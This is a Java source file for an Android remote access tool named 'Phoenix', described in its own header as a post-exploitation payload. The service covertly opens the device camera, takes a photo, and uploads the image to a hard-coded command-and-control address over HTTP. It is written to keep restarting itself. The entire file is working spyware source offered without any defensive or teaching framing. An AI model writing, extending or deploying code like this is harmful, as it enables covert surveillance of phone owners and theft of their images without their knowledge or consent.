/**
 * Project Phoenix - Camera Remote Access Tool
 * Post-exploitation payload for Android
 */

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.IBinder;
import android.os.AsyncTask;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class PhoenixRAT extends Service {
    private Camera camera;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        System.out.println("[Phoenix] RAT service starting...");
        capturePhoto();
        return START_STICKY;
    }
    
    public void capturePhoto() {
        try {
            System.out.println("[Phoenix] Accessing camera...");
            camera = Camera.open();
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    System.out.println("[Phoenix] Photo captured! Size: " + data.length);
                    new PhoenixUploadTask().execute(data);
                    camera.stopPreview();
                    camera.release();
                }
            });
        } catch (Exception e) {
            System.err.println("[Phoenix] Camera error: " + e.getMessage());
        }
    }
    
    private class PhoenixUploadTask extends AsyncTask<byte[], Void, Void> {
        @Override
        protected Void doInBackground(byte[]... params) {
            try {
                System.out.println("[Phoenix] Uploading to C2 server...");
                URL url = new URL("http://192.168.1.100:8080/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(params[0]);
                os.flush();
                os.close();
                System.out.println("[Phoenix] Upload complete!");
            } catch (Exception e) {
                System.err.println("[Phoenix] Upload failed: " + e.getMessage());
            }
            return null;
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
